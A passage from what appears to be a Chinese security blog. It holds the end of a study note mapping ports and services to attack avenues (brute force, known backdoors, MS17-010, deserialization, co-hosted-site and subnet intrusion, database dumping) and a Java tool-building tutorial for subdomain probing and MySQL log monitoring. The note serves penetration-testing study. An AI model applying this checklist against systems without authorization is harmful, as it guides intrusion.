<td>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td>
</tr>
<tr>
<td>tcp 22</td>
<td>SSH</td>
<td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等</td>
</tr>
<tr>
<td>tcp 23</td>
<td>Telnet</td>
<td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令</td>
</tr>
<tr>
<td>tcp 25</td>
<td>SMTP</td>
<td>邮件伪造,vrfy/expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
</tr>
<tr>
<td>tcp/udp 53</td>
<td>DNS</td>
<td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td>
</tr>
<tr>
<td>tcp/udp 69</td>
<td>TFTP</td>
<td>尝试下载目标及其的各类重要配置文件</td>
</tr>
<tr>
<td>tcp 80-89,443,8440-8450,8080-8089</td>
<td>各种常用的Web服务端口</td>
<td>可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等……</td>
</tr>
<tr>
<td>tcp 110</td>
<td>POP3</td>
<td>可尝试爆破,嗅探</td>
</tr>
<tr>
<td>tcp 111,2049</td>
<td>NFS</td>
<td>权限配置不当</td>
</tr>
<tr>
<td>tcp 137,139,445</td>
<td>Samba</td>
<td>可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td>
</tr>
<tr>
<td>tcp 143</td>
<td>IMAP</td>
<td>可尝试爆破</td>
</tr>
<tr>
<td>udp 161</td>
<td>SNMP</td>
<td>爆破默认团队字符串,搜集目标内网信息</td>
</tr>
<tr>
<td>tcp 389</td>
<td>LDAP</td>
<td>ldap注入,允许匿名访问,弱口令</td>
</tr>
<tr>
<td>tcp 512,513,514</td>
<td>Linux rexec</td>
<td>可爆破,rlogin登陆</td>
</tr>
<tr>
<td>tcp 873</td>
<td>Rsync</td>
<td>匿名访问,文件上传</td>
</tr>
<tr>
<td>tcp 1194</td>
<td>OpenVPN</td>
<td>想办法钓VPN账号,进内网</td>
</tr>
<tr>
<td>tcp 1352</td>
<td>Lotus</td>
<td>弱口令,信息泄漏,爆破</td>
</tr>
<tr>
<td>tcp 1433</td>
<td>SQL Server</td>
<td>注入,提权,sa弱口令,爆破</td>
</tr>
<tr>
<td>tcp 1521</td>
<td>Oracle</td>
<td>tns爆破,注入,弹shell…</td>
</tr>
<tr>
<td>tcp 1500</td>
<td>ISPmanager</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 1723</td>
<td>PPTP</td>
<td>爆破,想办法钓VPN账号,进内网</td>
</tr>
<tr>
<td>tcp 2082,2083</td>
<td>cPanel</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 2181</td>
<td>ZooKeeper</td>
<td>未授权访问</td>
</tr>
<tr>
<td>tcp 2601,2604</td>
<td>Zebra</td>
<td>默认密码zerbra</td>
</tr>
<tr>
<td>tcp 3128</td>
<td>Squid</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 3312,3311</td>
<td>kangle</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 3306</td>
<td>MySQL</td>
<td>注入,提权,爆破</td>
</tr>
<tr>
<td>tcp 3389</td>
<td>Windows rdp</td>
<td>shift后门[需要03以下的系统],爆破,ms12-020</td>
</tr>
<tr>
<td>tcp 3690</td>
<td>SVN</td>
<td>svn泄露,未授权访问</td>
</tr>
<tr>
<td>tcp 4848</td>
<td>GlassFish</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 5000</td>
<td>Sybase/DB2</td>
<td>爆破,注入</td>
</tr>
<tr>
<td>tcp 5432</td>
<td>PostgreSQL</td>
<td>爆破,注入,弱口令</td>
</tr>
<tr>
<td>tcp 5900,5901,5902</td>
<td>VNC</td>
<td>弱口令爆破</td>
</tr>
<tr>
<td>tcp 5984</td>
<td>CouchDB</td>
<td>未授权导致的任意指令执行</td>
</tr>
<tr>
<td>tcp 6379</td>
<td>Redis</td>
<td>可尝试未授权访问,弱口令爆破</td>
</tr>
<tr>
<td>tcp 7001,7002</td>
<td>WebLogic</td>
<td>Java反序列化,弱口令</td>
</tr>
<tr>
<td>tcp 7778</td>
<td>Kloxo</td>
<td>主机面板登录</td>
</tr>
<tr>
<td>tcp 8000</td>
<td>Ajenti</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 8443</td>
<td>Plesk</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 8069</td>
<td>Zabbix</td>
<td>远程执行,SQL注入</td>
</tr>
<tr>
<td>tcp 8080-8089</td>
<td>Jenkins,JBoss</td>
<td>反序列化,控制台弱口令</td>
</tr>
<tr>
<td>tcp 9080-9081,9090</td>
<td>WebSphere</td>
<td>Java反序列化/弱口令</td>
</tr>
<tr>
<td>tcp 9200,9300</td>
<td>ElasticSearch</td>
<td>远程执行</td>
</tr>
<tr>
<td>tcp 11211</td>
<td>Memcached</td>
<td>未授权访问</td>
</tr>
<tr>
<td>tcp 27017,27018</td>
<td>MongoDB</td>
<td>爆破,未授权访问</td>
</tr>
<tr>
<td>tcp 50070,50030</td>
<td>Hadoop</td>
<td>默认端口未授权访问</td>
</tr>
</tbody></table>
<h1 id="十五、Nmap"><a href="#十五、Nmap" class="headerlink" title="十五、Nmap"></a>十五、Nmap</h1><p>Nmap是一个网络连接端口扫描软件，用来扫描网上电脑开放的网络连接端口。确定哪些服务运行在哪些连接端口，并且推断计算机运行哪个操作系统。它是网络管理员必用的软件之一，以及用以评估网络系统安全。<br>功能:<br>1、 主机发现<br>2、 端口扫描<br>3、 版本侦测<br>4、 OS侦测</p>
<h1 id="十六、旁站C段查询"><a href="#十六、旁站C段查询" class="headerlink" title="十六、旁站C段查询"></a>十六、旁站C段查询</h1><p>旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！</p>
<p>对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。</p>
<p>旁站和C段在线查询地址：</p>
<p><a href="http://www.webscan.cc/">http://www.webscan.cc/</a></p>
<p>旁站：是和目标网站在同一台服务器上的其它的网站。</p>
<p>旁注：通过入侵安全性较差的旁站，之后可以通过提权跨目录等手段拿到目标服务器的权限。</p>
<p>工具：K8_C段旁注工具、WebRobot、御剑、明小子 …</p>
<p>C段：每个IP有ABCD四个段，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务。比如192.168.3.0-255的设备都处于同一个c段。</p>
<p>C段入侵：目标ip为192.168.1.128，可以入侵192.168.1.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。</p>
<p>工具：Cain、Sniffit 、Snoop、Tcpdump、Dsniff …</p>
<h1 id="十七、其他信息"><a href="#十七、其他信息" class="headerlink" title="十七、其他信息"></a>十七、其他信息</h1><p>Web敏感文件<br>robots.txt、crossdomin.xml、sitemap.xml、源码泄漏文件 …</p>
<p>WAF信息<br>WAF识别大多基于Headers头信息，还可以使用Wafw00f，Sqlmap的waf脚本，Nmap的http-waf-detect和http-waf-fingerprint脚本等等。</p>
<p>相关漏洞<br>漏洞查询站点：exploitdb、hackerone、CNVD、0day5、乌云漏洞库镜像站 …</p>
<p>扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏</p>
<p>后台目录：弱口令，万能密码，爆破<br>安装包：获取数据库信息，甚至是网站源码<br>上传目录：截断、上传图片马等<br>mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell<br>安装页面 ：可以二次安装进而绕过<br>phpinfo：会把你配置的各种信息暴露出来<br>富文本编辑器<br>iis短文件利用：条件比较苛刻 windows、apache等</p>
<p>robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可<br>以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。<br>假如编写的robots.txt文件内容如下：</p>
<p>User-agent: *<br>Disallow: /data/<br>Disallow: /db/<br>Disallow: /admin/<br>Disallow: /manager/<br>Allow:/images/<br>其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/ 即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。</p>
<p>探测目标网站后台目录的工具有： wwwscan 、御剑 、 dirbuster、cansina 等</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>安全小白怎么从零开始拥有自己的武器库</title>
    <url>/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>前些日子跟个大佬搞攻防，看着大佬超神我超鬼，不得不佩服大佬，看着大佬用的很多工具都没见过，问了下这些工具是啥，大佬掏出了他的大宝贝给我看，嚯，好家伙，一整个文件夹都是自己开发的工具还有一些魔改的工具，属实羡慕，看着大佬那些工具，陷入沉思，是不是我也可以有自己的武器库🤨总不能当伸手党吧，而且还能熟悉语言，增强自己在代码审计那块的。刚好之前搞过一段时间的开发，对于开发一些工具啥的还是有自己的想法的，说干就干，这个系列是写安全小白怎么从零开始拥有自己的一个工具库的文章，在开发方面我也是菜鸟，所以可能有些工具的开发思路跟那些流行的工具思路可能不一样，有哪写得不好的地方，希望大佬们能带带我。</p>
<span id="more"></span>

<h1 id="二、前期准备"><a href="#二、前期准备" class="headerlink" title="二、前期准备"></a>二、前期准备</h1><h2 id="2-1语言选择"><a href="#2-1语言选择" class="headerlink" title="2.1语言选择"></a>2.1语言选择</h2><p>开发工具嘛，肯定要会一两个语言，相信各位大佬肯定掌握了不止三四种的语言，小弟没啥能力，只掌握了C，java，python，php，go这几种，用来开发工具的话比较常见的就是java，python，go了，我比较熟悉那个java和python，而且一些常见的工具也是用的java和python来开发的，这两种语言的区别就不介绍了，大家都懂的，选择哪种主要看个人的需求，如果想省点事的话可以用python，里面的库用到才知道香，但是python虚拟机没有java强，毕竟java虚拟机是java的核心，而且python是全动态性的，可以在运行时自己修改自己的代码，java只能通过变通方法实现。python的变量是动态的，而java的变量是静态的，需要事先声明，所以java ide的代码提示功能优于python ide。</p>
<p>用java开发工具的话主要是习惯了用java开发有界面的工具，而python的话主要是因为库强大，可以少写很多东西，省很多时间，当然不是说python没办法搞界面，python是推出了一些框架用于开发界面的，其中最常用的就是一个是Django，Django是一个较为高级的Python Web框架，以快速开发和实用简洁的设计闻名，关于语言的选择还是看个人习惯吧，没有谁好谁坏的说法。</p>
<h2 id="2-2编译器"><a href="#2-2编译器" class="headerlink" title="2.2编译器"></a>2.2编译器</h2><p>java用的编译器是IDEA和eclipse，python用的是PyCharm，这几个都是很不错的编译器，就是有些只能试用或者找破解，下完编译器，先建个项目，这边拿eclipse做下示范，进来先建个项目，这边选的是1.8.0的，然后把名字命名一下，搞一个com.AX.Database_listening，然后直接finish。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211220102525498.png" alt="image-20211220102525498"></p>
<p>搞完建好了，先看下目录结构SRC是我们之后写代码的地方，然后JRE这块是我们导入的包，事先有导入别的包，所以创建完之后会直接存在。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211220112758035.png" alt="image-20211220112758035"></p>
<p>一般我们在开发的时候都会用到别人写好的东西，而有些是需要你导入的，我们下载完别人的jar之后，在自己项目下面创建一个lib，把我们下载好的jar拉进去，然后右键项目，点击Properties，然后选择Java Build Path</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211220103338819.png" alt="image-20211220103338819"></p>
<p>找到你刚刚拉进来的jar，选中添加，然后保存，整个流程就结束了，这样我们在写其他功能的时候就会方便很多了。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211220112652185.png" alt="image-20211220112652185"></p>
<p>然后可以开始写你自己代码了。</p>
<h2 id="2-3语言能力"><a href="#2-3语言能力" class="headerlink" title="2.3语言能力"></a>2.3语言能力</h2><p>语言和编译器选完了，就该有人问了，我这语言得掌握到啥程度才能开发自己的工具，嚯，要问这话我也不知道该怎么回，毕竟我自己学的也不是很深，就JAVA来说，如果你接受过系统的学习的话，基本上都会在学完基础语法之后进入到线程，异常，文件访问，接口，继承等等这些知识，后面可能会学到例如网络通信协议的东西让你写一些通信的小demo，当然要会到什么程度才能开发自己的工具的话，看你个人的需求，我觉得基本上只要你会基础语法，知道函数，类，子类，父类，重写，继承啥的就可以自己去开发一些工具了。</p>
<p>如果你的工具只是针对于本地的东西的话，你只需了解你想要实现的原理，后面根据这个原理去设计你的开发架构，那你压根不需要用到什么网络通信协议啥的，但是如果你需要对接网络上的一些资源的话，那么通信协议还是得会的，当然，这些对百度工程师是例外的，把你想要实现的去百度上搜索，基本上都会有解答，百度能实现百分之99的困难。</p>
<h2 id="2-4开发思路"><a href="#2-4开发思路" class="headerlink" title="2.4开发思路"></a>2.4开发思路</h2><p>不管是开发啥，你对成果一定要有个大概的框架，不一定要先想好界面，但是功能，要实现怎样的功能，这些功能能实现什么样的效果，以及如何去实现这些功能。大部分工具开发的流程都是一致的，基本上都是三部分：</p>
<ol>
<li>数据获取：怎么获取你想要的数据，例如怎么和网站进行通信，怎么连接数据库，怎么获取数据库的数据等等</li>
<li>数据处理：拿到数据之后，如何对数据进行处理，获取到你想要的那部分数据，一般我们在数据获取的的时候，是没办法直接获取到你想要的那部分数据的，基本上都是一锅端回来，然后根据显示出来的数据情况进行筛选，过滤，还有一种情况就是你获取到的数据需要进一步的处理，例如你获取回来的数据需要再进行一轮的数据分析，或者与你现有的特征进行比对等等这些情况，所以在数据获取和数据处理这两个方面是开发工具的时候最难的地方。</li>
<li>数据显示：如果前面数据获取和数据处理都完成了，那么就来到了最简单的地方，怎么呈现你的结果，是命令行还是界面，这个取决于个人喜好。</li>
</ol>
<p>所以，根据这三个部分基本上能满足你开发大部分的工具，而且你在开发这些工具的时候思路会很清晰，始终清楚自己在哪一部分，在哪一部分就干哪一部分的事情，找那块的解决方法，网上会有很多教程，其实工具就类似是拼图，你这找一下怎么实现，那找一下怎么实现，然后拼接起来，就成了工具，一句话，CCV，一把梭哈，冲就完事了。这里附下小弟我搞小工具的时候常规的思维导图。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211127004010265.png" alt="image-20211127004010265"></p>
<h1 id="三、开发过程"><a href="#三、开发过程" class="headerlink" title="三、开发过程"></a>三、开发过程</h1><p>这里如果空讲的话会有点空泛，我用我之前搞的一个小工具来做例子吧，直接说我自己开发这个工具的时候的一个开发思路会比较好一点，这是个子域名的一个探测工具，主要功能的话就是根据你输入的域名进行子域名的探测，然后根据页面的状态剔除那些无法访问的，把可以访问的留下来保存数据，这个是我后面用来采集页面样本然后做页面分类的，所以还有其他功能，这里我主要讲下如何探测子域名状态值的设计思路和开发过程。</p>
<h2 id="3-1开发架构"><a href="#3-1开发架构" class="headerlink" title="3.1开发架构"></a>3.1开发架构</h2><p>架构的话根据三个流程来准备，然后搞个思维导图（虽然也没啥必要，但是可以让后面自己的思路清晰，不会跑偏）</p>
<ol>
<li>数据获取：怎么通过域名连接到网站，然后获取到网站的状态值</li>
<li>数据处理：获取完数据之后怎么处理数据，将数据整理成我想要的格式，例如，域名，IP，开放端口，网站状态这样，把有用的数据单独拿出来</li>
<li>数据显示：数据处理完之后通过界面显示出收集的结果，然后把数据导出来，通过固定格式保存，方便之后的操作。</li>
</ol>
<p>贴下思维导图，这里只写了探测网站状态值那部分，其他的功能都差不多的，每个人的思路会有所不同，所以这块没啥大问题。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211128180018515.png" alt="image-20211128180018515"></p>
<h2 id="3-2实现目标"><a href="#3-2实现目标" class="headerlink" title="3.2实现目标"></a>3.2实现目标</h2><h3 id="3-2-1获取网站状态值"><a href="#3-2-1获取网站状态值" class="headerlink" title="3.2.1获取网站状态值"></a>3.2.1获取网站状态值</h3><p>如何获取网站状态值在上面的思维导图上面已经写了，通过java的uConnection.getResponseCode()可以获取状态码。进而判断该网站是否存在，具体代码怎么用以及返回的值，类型可以自己百度一下，我这里贴一下关键代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URL u = <span class="keyword">new</span> URL(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">	HttpURLConnection uConnection = (HttpURLConnection)u.openConnection();  </span><br><span class="line">	<span class="keyword">try</span> &#123;  </span><br><span class="line">		uConnection.connect();</span><br><span class="line">		System.out.println(uConnection.getResponseCode());  </span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">			e.printStackTrace();  </span><br><span class="line">		&#125;                    </span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">			e.printStackTrace();  </span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>上面就是一个简单的通过url去连接网站，获取它返回的状态值，然后输出状态值，因为这里是连接的<a href="http://www.baidu.com,所以返回的是200,这个你们可以直接拿去运行看看内容,这个就是简单的一个实现过程,然后后面的可以把自己的字典导进去,获取你字典的数据,拼接到.baidu.com前面,再弄个多线程让他一直探测下去获取返回的值就行了./">www.baidu.com，所以返回的是200，这个你们可以直接拿去运行看看内容，这个就是简单的一个实现过程，然后后面的可以把自己的字典导进去，获取你字典的数据，拼接到.baidu.com前面，再弄个多线程让他一直探测下去获取返回的值就行了。</a></p>
<h3 id="3-2-2筛选自己想要的数据"><a href="#3-2-2筛选自己想要的数据" class="headerlink" title="3.2.2筛选自己想要的数据"></a>3.2.2筛选自己想要的数据</h3><p>上面我们已经拿到了网站的状态值，那么我们可以根据返回的状态值去对数据进行判断是不是该存起来，一个if就能解决的事情了，如果你想根据状态值来分类的话搞个switch就行了，例如说我们想要过滤一些数据，用if去过滤这些数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (!logres.equals(logsql) &amp;&amp; !logres.contains(<span class="string">&quot;/* mysql&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;SHOW WARNINGS&quot;</span>) &amp;&amp; !logres.contains(<span class="string">&quot;select event_time,argument from%%&quot;</span>))</span><br><span class="line">Database_listening.sql_date.appendText(time.format(Long.valueOf(System.currentTimeMillis()))+<span class="string">&quot;------&quot;</span>+logres+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样虽然方便，但是当你想要过滤的数据过多的时候，就需要列很长的条件，这样就太麻烦了，这时候就需要用其他的一些技能，比如说把黑名单存到文档然后根据文档里的内容去进行拦截等其他方式。</p>
<h3 id="3-2-3界面实现"><a href="#3-2-3界面实现" class="headerlink" title="3.2.3界面实现"></a>3.2.3界面实现</h3><p>这里说下几个面板，这个算是JAVAFX里面比较常见的面板了，其实界面没什么，就跟HTML差不多，一个套一个，套娃来的，你只要提前想好你自己的数据想要显示的位置，然后去布置按钮位置，数据显示位置就行了。</p>
<ul>
<li>StackPane（堆叠面板）：节点按照被添加的顺序从左到右、从上到下显示。</li>
<li>FlowPane（流式面板 ）：节点在5个区域显示－上、下、左、右、中</li>
<li>GridPane（栅格面板）：节点以灵活的行列栅格形式排列，这个可以根据自己的安排去排列那些元素的位置(0,0),(0,1),(1,0)(1,1)这样</li>
<li>BorderPane（边界面板）：将节点有序地排列在一个水平行中。当节点到达面板边界时，不会折行显示。</li>
<li>Hbox、Vbox（盒式面板）：Hbox将节点有序地排列在一个垂直列中。当节点到达面板边界时，不会折行显示，Vbox将节点有序地排列在一个中。当节点到达面板边界时，不会折行显示。</li>
</ul>
<p>其实这个是很简单的面板介绍，基本上都是按这些面板去堆叠出来的，我这里贴一个简单的面板加按钮的示例代码，运行这个看的话可能会更理解点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">label = <span class="keyword">new</span> Label(<span class="string">&quot;累加计数 &quot;</span>+count);</span><br><span class="line">Button btnPush = <span class="keyword">new</span> Button (<span class="string">&quot;+1&quot;</span>);	</span><br><span class="line"><span class="comment">//设置一个label和button</span></span><br><span class="line">btnPush.setOnAction(<span class="keyword">this</span>::btnPushHandler);</span><br><span class="line"><span class="comment">//设置按钮的事件，点击按钮之后会发生什么事情</span></span><br><span class="line">FlowPane pane = <span class="keyword">new</span> FlowPane (btnPush,label);</span><br><span class="line"><span class="comment">//然后把按钮和label放到面板里面，这个是流式的，直接横着排列</span></span><br><span class="line">pane.setHgap(<span class="number">20</span>);</span><br><span class="line">pane.setAlignment(Pos.CENTER);</span><br><span class="line">Scene scene = <span class="keyword">new</span> Scene(pane, <span class="number">300</span>,<span class="number">100</span>);</span><br><span class="line"><span class="comment">//设置面板大小</span></span><br><span class="line">stage.setScene(scene);</span><br><span class="line">stage.setTitle(<span class="string">&quot;面板示例&quot;</span>);</span><br><span class="line"><span class="comment">//面板title</span></span><br><span class="line">stage.show();</span><br><span class="line"><span class="comment">//显示出来</span></span><br></pre></td></tr></table></figure>

<p>这个面板也完成了，当你把面板设计好之后，把你完成的代码分模块放到每个按钮的事件里面去，上面的那句btnPush.setOnAction(this::btnPbushHandler)是把btnPbushHandler事件设置到btnPush这个按钮里面去，当点击到btnPush按钮的时候，执行该事件，例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Connect_SQL = <span class="keyword">new</span> Button(<span class="string">&quot;连接数据库&quot;</span>);</span><br><span class="line"><span class="comment">//设置一个按钮叫Connect_SQL</span></span><br><span class="line">Connect_SQL.setOnAction(<span class="keyword">this</span>::ConnectSQL);</span><br><span class="line"><span class="comment">//点击该按钮之后执行ConnectSQL事件</span></span><br><span class="line">------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//编写ConnectSQL，当点击了该按钮之后执行ConnectSQL事件，去连接数据库</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConnectSQL</span><span class="params">(ActionEvent event)</span></span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	ConnectSQL.Connect(sql_addr.getText(), sql_port.getText(), sql_user.getText(), sql_password.getText());</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">	e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就把按钮和事件响应连接起来，设计相对应的按钮和事件，去达到自己想要实现的目标，基本上这个工具就完成了，当工具写完了之后，不可能每次都进编译器里面去运行吧，把它导出来成为一个.jar的文件，之后直接执行这个文件就行了。</p>
<p>右键项目，点击Export，选择jar file</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211220112323902.png" alt="image-20211220112323902"></p>
<p>然后把自己的项目勾选上，直接finish，就完成了。</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/image-20211220112454283.png" alt="image-20211220112454283"></p>
<p>至此，整个工具的编写就完成了</p>
<h1 id="四、实战"><a href="#四、实战" class="headerlink" title="四、实战"></a>四、实战</h1><h2 id="4-1工具说明"><a href="#4-1工具说明" class="headerlink" title="4.1工具说明"></a>4.1工具说明</h2><p>一个Mysql监控工具的思路以及实现方式，实现了指定数据库名监控跟它有关的sql语句，单独显示特定的sql语句,刚开始自己用的那些网上的工具不是很理想，所以就打算自己写一个，目前只实现了这两个功能，后面会把它改成一个代审工具，实现从sql语句跳定位到代码啥的。</p>
<h2 id="4-2开发思路"><a href="#4-2开发思路" class="headerlink" title="4.2开发思路"></a>4.2开发思路</h2><p>工具的思路其实也很简单，主要就是这四块</p>
<ol>
<li>连接数据库</li>
<li>监听数据库日志</li>
<li>对数据库日志的数据进行过滤</li>
<li>显示数据</li>
</ol>
<p>而工具最终目标是：用户连接上数据库之后，在测试代码或者网站功能的时候，经过该工具过滤能够定位到执行的sql语句，方便进行代码审计</p>
<p><img src="https://ax-x.github.io/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/20211115165221-5892b92c-45f1-1-16407678891502.png" alt="image.png"></p>
<h2 id="4-3前期准备"><a href="#4-3前期准备" class="headerlink" title="4.3前期准备"></a>4.3前期准备</h2><ul>
<li>连接数据库实现</li>
<li>兼容不同的Mysql版本</li>
<li>监听数据库的方式</li>
<li>过滤脏数据</li>
<li>准确过滤出自己想要的语句</li>
</ul>
<h2 id="4-4目标实现"><a href="#4-4目标实现" class="headerlink" title="4.4目标实现"></a>4.4目标实现</h2><h3 id="4-4-1连接数据库"><a href="#4-4-1连接数据库" class="headerlink" title="4.4.1连接数据库"></a>4.4.1连接数据库</h3><h4 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h4><p>连接数据库我用的是JDBC去连接MySQL数据库，连接 MySQL的话需要 需要驱动包，最新版下载地址为：**<a href="http://dev.mysql.com/downloads/connector/j/**%EF%BC%8C%E8%A7%A3%E5%8E%8B%E5%90%8E%E5%BE%97%E5%88%B0">http://dev.mysql.com/downloads/connector/j/**，解压后得到</a> jar 库文件，然后在对应的项目中导入该库文件。要兼容版本的话得下两个jar，一个兼容8以上的，一个兼容以下的。</p>
<p>MySQL 8.0 以上版本的数据库连接部分不同：</p>
<p>MySQL 8.0 以上版本驱动包版本<a href="https://static.runoob.com/download/mysql-connector-java-8.0.16.jar">mysql-connector-java-8.0.16.jar</a>。</p>
<p>com.mysql.jdbc.Driver 更换为com.mysql.cj.jdbc.Driver。</p>
<p>MySQL 8.0以上版本无需建立SSL连接，需要显示关闭。</p>
<p>allowPublicKeyRetrieval=true 允许客户端从服务器获取密钥，最后还需要设置 CST</p>
<p>加载驱动与连接数据库方式如下：</p>
